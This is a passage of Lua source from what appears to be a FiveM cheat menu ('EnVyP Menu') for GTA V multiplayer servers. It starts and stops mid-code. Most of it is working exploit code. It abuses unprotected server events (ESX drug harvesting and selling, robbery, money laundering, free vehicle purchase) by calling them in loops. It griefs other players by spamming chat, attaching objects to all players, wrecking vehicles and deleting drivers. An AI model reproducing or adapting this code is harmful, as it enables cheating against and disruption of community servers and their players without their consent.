          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, true)
          FreezeEntityPosition(cage2, true)
        end
      end

      local function bananapartyall()
        Citizen.CreateThread(function()
        for c = 0, 9 do

          TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."EnVyP Community - Hello guys!")
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
          local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
          local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
          AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
        end
        end)
      end

      local function RespawnPed(ped, coords, heading)
        SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetPlayerInvincible(ped, false)
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        ClearPedBloodDamage(ped)
      end

      local function teleporttocoords()
        local pizdax = KeyboardInput("Enter X pos", "", 100)
        local pizday = KeyboardInput("Enter Y pos", "", 100)
        local pizdaz = KeyboardInput("Enter Z pos", "", 100)
        if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
          if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
            entity = GetPlayerPed(-1)
          end
          if entity then
            SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
            notify("~g~Teleported to coords!", false)
          end
        else
          notify("~b~Invalid coords!", true)
        end
      end

      local function drawcoords()
        local name = KeyboardInput("Enter Blip Name", "", 100)
        if name == "" then
          notify("~b~Invalid Blip Name!", true)
          return drawcoords()
        else
          local pizdax = KeyboardInput("Enter X pos", "", 100)
          local pizday = KeyboardInput("Enter Y pos", "", 100)
          local pizdaz = KeyboardInput("Enter Z pos", "", 100)
          if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
            local blips = {
              {colour=75, id=84},
            }
            for _, info in pairs(blips) do
              info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
              SetBlipSprite(info.blip, info.id)
              SetBlipDisplay(info.blip, 4)
              SetBlipScale(info.blip, 0.9)
              SetBlipColour(info.blip, info.colour)
              SetBlipAsShortRange(info.blip, true)
              BeginTextCommandSetBlipName("STRING")
              AddTextComponentString(name)
              EndTextCommandSetBlipName(info.blip)
            end
          else
            notify("~b~Invalid coords!", true)
          end
        end
      end

      local function teleporttonearestvehicle()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, true)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        notify("~y~Wait...", false)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          notify("~b~No Vehicle Found", true)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
          end
          notify("~g~Teleported Into Nearest Vehicle!", false)
        end
      end

      local function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = true
        else
          notify("~b~No waypoint!", true)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
            if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
            then
              entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
              entity = GetPlayerPed(-1)
            end

            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local Pos = GetEntityCoords(entity, true)

            if zHeigt == 0.0 then
              height = height - 25.0
              SetEntityCoords(entity, Pos.x, Pos.y, height)
              bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
            else
              SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
              FreezeEntityPosition(entity, false)
              wp = false
              height = 1000.0
              zHeigt = 0.0
              notify("~g~Teleported to waypoint!", false)
              break
            end
          end
        end
      end

      local function spawnvehicle()
        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
            Citizen.Wait(0)
          end
          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          notify("~b~Model is not valid!", true)
        end
      end

      local function repairvehicle()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function refuelcar()
        local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
        if not DoesEntityExist(veh) then
          notify(
          'You must be in a ~r~vehicle ~w~to use this !'
          )
        else
          TriggerServerEvent(
          'advancedFuel:setEssence',
          100,
          GetVehicleNumberPlateText(veh),
          GetDisplayNameFromVehicleModel(GetEntityModel(veh))
          )
          SetVehicleEngineOn(veh, true, false, false)
          SetVehicleUndriveable(veh, false)
        end
      end
      local function repairengine()
        SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function GetVehicleInFrontOfMe()

        local playerPos = GetEntityCoords( PlayerPedId() )
        local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
        local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
        local _, _, _, _, vehicle = GetRaycastResult( rayHandle )

        return vehicle
      end

      local function TeleportToPlayerVehicle(player)
        local ped = GetPlayerPed(player)
        if not IsPedInAnyVehicle(ped) then
          return notify("Player is not in a vehicle!")
        end

        local vehicle = GetVehiclePedIsUsing(GetPlayerPed(player))

        local seats = GetVehicleMaxNumberOfPassengers(vehicle)
        for i = 0, seats do
          if IsVehicleSeatFree(vehicle, i) then
            SetPedIntoVehicle(PlayerPedId(), vehicle, i)
            break
          end
        end
      end

      local function GetVehicleInFrontOfMe()

        local playerPos = GetEntityCoords( PlayerPedId() )
        local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
        local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
        local _, _, _, _, vehicle = GetRaycastResult( rayHandle )

        return vehicle
      end

      local function DriveVehicle(vehicle)
        if vehicle == 0 then
          vehicle = GetVehicleInFrontOfMe()
        end

        SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
      end

      local function carlicenseplaterino()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        local result = KeyboardInput("Enter the plate license you want", "", 100)
        if result ~= "" then
          SetVehicleNumberPlateText(playerVeh, result)
        end
      end

      function hweed()
        TSE("esx_drugs:startHarvestWeed")
        TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
        TriggerServerEvent('esx_drugs:pickedUpCannabis')
      end

      function tweed()
        TSE("esx_drugs:startTransformWeed")
        TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
        TriggerServerEvent('esx_drugs:processCannabis')
      end

      function sweed()
        TriggerServerEvent("esx_drugs:startSellWeed")
        TriggerServerEvent("esx_illegal_drugs:startSellWeed")
      end

      function sdrugs()
        for i = 0, 5 do
          TriggerServerEvent('sellDrugs')
          TriggerEvent("sellingdrugs")
          TriggerEvent("sold")
          TriggerServerEvent("t1ger_drugs:sellDrugs")
        end
      end

      function hcoke()
        for i = 0, 5 do
          TriggerServerEvent("esx_drugs:startSellWeed")
          TriggerServerEvent("esx_illegal_drugs:startSellWeed")
          TriggerServerEvent('esx_drugs:startHarvestCoke')
          TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
        end
      end

      function tcoke()
        for i = 0, 5 do 
        TriggerServerEvent('esx_drugs:startTransformCoke')
        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
        end
      end

      function scoke()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startSellCoke')
          TriggerServerEvent('esx_illegal_drugs:startSellCoke')
        end
      end

      function hmeth()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startHarvestMeth')
          TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
          TriggerServerEvent('MF_MobileMeth:RewardPlayers')
        end
      end

      function tmeth()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startTransformMeth')
          TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
        end
      end

      function smeth()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startSellMeth')
          TriggerServerEvent('esx_illegal_drugs:startSellMeth')
        end
      end

      function hopi()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startHarvestOpium')
          TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
        end
      end

      function topi()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startTransformOpium')
          TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
        end
      end

      function sopi()
        for i = 0, 5 do 
          TriggerServerEvent('esx_drugs:startSellOpium')
          TriggerServerEvent('esx_illegal_drugs:startSellOpium')
        end
      end

      function jewelry()
        for i = 0, 5 do 
          TriggerServerEvent("esx_vangelico_robbery:gioielli1")
        end
      end

      function mataaspalarufe()
        TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
        TriggerServerEvent('esx_blanchisseur:washMoney', 100)
        TriggerServerEvent('esx_blackmoney:washMoney')
        TriggerServerEvent('esx_moneywash:withdraw', 100)
        TriggerServerEvent('laundry:washcash')
      end

      function matanumaispalarufe()
        TSE("esx_drugs:stopHarvestCoke")
        TSE("esx_drugs:stopTransformCoke")
        TSE("esx_drugs:stopSellCoke")
        TSE("esx_drugs:stopHarvestMeth")
        TSE("esx_drugs:stopTransformMeth")
        TSE("esx_drugs:stopSellMeth")
        TSE("esx_drugs:stopHarvestWeed")
        TSE("esx_drugs:stopTransformWeed")
        TSE("esx_drugs:stopSellWeed")
        TSE("esx_drugs:stopHarvestOpium")
        TSE("esx_drugs:stopTransformOpium")
        TSE("esx_drugs:stopSellOpium")
        notify("~b~Everything is now stopped.", false)
      end

      function doshit(playerVeh)
        RequestControl(playerVeh)
        SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
        SetEntityAsMissionEntity(playerVeh, false, false)
        StartVehicleAlarm(playerVeh)
        DetachVehicleWindscreen(playerVeh)
        SmashVehicleWindow(playerVeh, 0)
        SmashVehicleWindow(playerVeh, 1)
        SmashVehicleWindow(playerVeh, 2)
        SmashVehicleWindow(playerVeh, 3)
        SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
        SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
        SetVehicleDoorBroken(playerVeh, 0, true)
        SetVehicleDoorBroken(playerVeh, 1, true)
        SetVehicleDoorBroken(playerVeh, 2, true)
        SetVehicleDoorBroken(playerVeh, 3, true)
        SetVehicleDoorBroken(playerVeh, 4, true)
        SetVehicleDoorBroken(playerVeh, 5, true)
        SetVehicleDoorBroken(playerVeh, 6, true)
        SetVehicleDoorBroken(playerVeh, 7, true)
        SetVehicleLights(playerVeh, 1)
        Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
        SetVehicleNumberPlateTextIndex(playerVeh, 5)
        SetVehicleNumberPlateText(playerVeh, "EnVyPMenu")
        SetVehicleDirtLevel(playerVeh, 10.0)
        SetVehicleModColor_1(playerVeh, 1)
        SetVehicleModColor_2(playerVeh, 1)
        SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
        SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
        SetVehicleBurnout(playerVeh, true)
      end

      function matacumparamasini()
        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
        local NewPlate = KeyboardInput("Enter Vehicle Licence Plate", "", 100)

        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
            Citizen.Wait(0)
          end

          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
          SetVehicleNumberPlateText(veh, NewPlate)
          local vehProps = ESX.Game.GetVehicleProperties(veh)
          --TSE("esx_vehicleshop:setVehicleOwned", vehProps)
          TriggerServerEvent('JAM_VehicleShop:CompletePurchase', vehProps)
          notify("~g~~h~Success", false)
        else
          notify("~b~~h~Model is not valid !", true)
        end
      end

      function daojosdinpatpemata()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          notify("~g~Vehicle Flipped!", false)
        else
          notify("~b~You Aren't In The Driverseat Of A Vehicle!", true)
        end
      end


      function stringsplit(inputstr, sep)
        if sep == nil then
          sep = "%s"
        end
        local t = {}
        i = 1
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
          t[i] = str
          i = i + 1
        end
        return t
      end

      function SpectatePlayer(player)
        local target = GetPlayerPed(player)
        Spectating = not Spectating

        Citizen.CreateThread(function()
        if not Spectating then
          RequestCollisionAtCoord(GetEntityCoords(target))
          NetworkSetInSpectatorMode(false, target)
          SetMinimapInSpectatorMode(false, 0)
          if not IsPedInAnyVehicle(GetPlayerPed(-1)) then
            ClearPedTasks(PlayerPedId())
          end
          notify("Stopped Spectating " .. GetPlayerName(player), false)
          SpectatedPlayer = nil
        else
          RequestCollisionAtCoord(GetEntityCoords(target))
          NetworkSetInSpectatorMode(true, target)
          if not IsPedInAnyVehicle(GetPlayerPed(-1)) then
            TaskWanderStandard(PlayerPedId(), 0, 0)
          end
          notify("Spectating " .. GetPlayerName(player), false)
          SpectatedPlayer = player

            while Spectating do 
              SetMinimapInSpectatorMode(true, target)
              Wait(0)
            end
        end
      end)
    end

    function SpectatePlayer2(player)
      local target = GetPlayerPed(player)
      local veh = GetVehiclePedIsIn(target, 0)
      Spectating2 = not Spectating2

      if not Spectating2 then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), orgPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
        notify("Stopped Spectating " .. GetPlayerName(player), false)
        SpectatedPlayer2 = nil
      else
        orgPlayerPos = GetEntityCoords(PlayerPedId())
        SetEntityVisible(PlayerPedId(), false, 0)
        SetEntityCollision(PlayerPedId(), false, 0)
        notify("Spectating " .. GetPlayerName(player), false)        
        SpectatedPlayer2 = player

      Citizen.CreateThread(function()
        while Spectating2 do 
          local tarpos = GetEntityCoords(target)

          SetEntityCoords(PlayerPedId(), tarpos.x, tarpos.y, tarpos.z)
          SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
          Wait(0)
        end
      end)
    end
  end

      function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
      end

      function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end

      function DelVeh(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
      end


      function Clean(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function Clean2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function ApplyForce(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return true
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        ApplyForce(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end

      function DrawSpecialText(m_text, showtime)
        SetTextEntry_2("STRING")
        AddTextComponentString(m_text)
        DrawSubtitleTimed(showtime, 1)
      end

      Citizen.CreateThread(function()

      while true do
        Wait( 1 )
        for id = 0, 128 do

          if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

            ped = GetPlayerPed( id )
            blip = GetBlipFromEntity( ped )

            x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
            x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
            distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

            headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
            wantedLvl = GetPlayerWantedLevel( id )

            if showsprite then
